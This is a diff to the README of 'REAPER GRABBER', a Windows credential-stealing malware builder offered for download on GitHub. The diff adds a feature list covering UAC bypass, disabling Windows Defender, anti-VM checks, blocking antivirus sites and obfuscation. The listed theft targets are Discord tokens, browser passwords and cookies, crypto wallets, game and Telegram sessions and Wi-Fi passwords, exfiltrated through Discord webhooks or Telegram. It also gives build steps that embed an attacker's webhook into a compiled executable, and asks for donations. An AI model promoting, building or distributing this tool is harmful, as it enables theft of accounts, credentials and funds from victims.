@@ -1,5 +1,8 @@
+<p align="center">
+  <img src="https://i.ibb.co/1fPgfwhJ/REPAER-GREABBER.png" alt="REAPER GRABBER" width="100%">
+</p>
+
 <h1 align="center">
-   <img src="https://i.ibb.co/1fPgfwhJ/REPAER-GREABBER.png" width="250"><br>
    REAPER GRABBER V1.1
 </h1>
 
@@ -7,16 +10,17 @@
    <kbd>
    <img src="https://img.shields.io/badge/Status-Operational-brightgreen?style=for-the-badge">
    <img src="https://img.shields.io/badge/Release-v1.1-blueviolet?style=for-the-badge">
+   <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows">
    </kbd><br><br>
-   <img src="https://img.shields.io/github/languages/top/your-username/REAPER-GRABBER">
-   <img src="https://img.shields.io/github/stars/your-username/REAPER-GRABBER?style=social">
-   <img src="https://img.shields.io/github/forks/your-username/REAPER-GRABBER?style=social">
+   <img src="https://img.shields.io/github/languages/top/rxxamine/REAPER-GRABBER">
+   <img src="https://img.shields.io/github/stars/rxxamine/REAPER-GRABBER?style=social">
+   <img src="https://img.shields.io/github/forks/rxxamine/REAPER-GRABBER?style=social">
    <br>
-   <img src="https://img.shields.io/github/last-commit/your-username/REAPER-GRABBER">
-   <img src="https://img.shields.io/github/license/your-username/REAPER-GRABBER">
+   <img src="https://img.shields.io/github/last-commit/rxxamine/REAPER-GRABBER">
+   <img src="https://img.shields.io/github/license/rxxamine/REAPER-GRABBER">
    <br>
-   <img src="https://img.shields.io/github/issues/your-username/REAPER-GRABBER">
-   <img src="https://img.shields.io/github/issues-closed/your-username/REAPER-GRABBER">
+   <img src="https://img.shields.io/github/issues/rxxamine/REAPER-GRABBER">
+   <img src="https://img.shields.io/github/issues-closed/rxxamine/REAPER-GRABBER">
 </p>
 
 ## 💀 Premium Stealth Extraction Suite
@@ -27,21 +31,51 @@
 
 ## 🔥 Key Features
 
-    • 💜 Elite Obsidian GUI: Built with CustomTkinter for a modern feel.
-    • 🚀 Fast Compilation: Multi-threaded architecture prevents UI freezing.
-    • 🛡️ Error-Free Builds: Automatic directory management and clean-up.
-    • 🎭 Spoofing Support: Embed custom .ico files to disguise your payload.
-    • 💉 Dynamic Injection: Auto-injects webhooks into the reaper.py source.
-    • 🧹 Build Sanitizer: Automatically deletes temporary .spec and build folders.
+    • GUI Builder.
+    • UAC Bypass.
+    • Custom Icon.
+    • Runs On Startup.
+    • Disables Windows Defender.
+    • Anti-VM.
+    • Blocks AV-Related Sites.
+    • Melt Stub.
+    • Fake Error.
+    • EXE Binder.
+    • File Pumper.
+    • Obfuscated Code.
+    • Discord Injection.
+    • Steals Discord Tokens.
+    • Steals Steam Session.
+    • Steals Epic Session.
+    • Steals Uplay Session.
+    • Steals Passwords From Many Browsers.
+    • Steals Cookies From Many Browsers.
+    • Steals History From Many Browsers.
+    • Steals Autofills From Many Browsers.
+    • Steals Minecraft Session Files.
+    • Steals Telegram Session Files.
+    • Steals Crypto Wallets.
+    • Steals Roblox Cookies.
+    • Steals Growtopia Session.
+    • Steals IP Information.
+    • Steals System Info.
+    • Steals Saved Wifi Passwords.
+    • Steals Common Files.
+    • Captures Screenshot.
+    • Captures Webcam Image.
+    • Sends All Data Through Discord Webhooks/Telegram Bot.
+    (...more)
+
+---
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-REAPER--GRABBER-green?style=for-the-badge&logo=appveyor)](https://github.com/your-username/REAPER-GRABBER/archive/refs/heads/main.zip)
+[![Download Now](https://img.shields.io/badge/Download-REAPER--GRABBER-green?style=for-the-badge&logo=appveyor)](https://github.com/rxxamine/REAPER-GRABBER/archive/refs/heads/main.zip)
 
 ## 📖 How to Build
 
 1. **Install Python**: Ensure [Python 3.10+](https://www.python.org/) is installed and **"Add to PATH"** is checked.
-2. **Environment**: Install the required GUI library via CMD: `pip install customtkinter`.
+2. **Environment**: Install the required GUI library: `pip install customtkinter`.
 3. **Launch**: Open `reaper_builder.py`.
 4. **Configure**: Paste your Discord Webhook into the configuration field.
 5. **Compile**: Press **INITIALIZE BUILD**. Your executable will appear in `Build_Project/dist`.
@@ -50,7 +84,7 @@
 
 ## 💎 Support the Project
 
-If you find REAPER useful, help keep the engine running. Every contribution goes toward v2 development.
+Help keep the engine running and support future updates.
 
 | Asset | Wallet Address |
 | :--- | :--- |
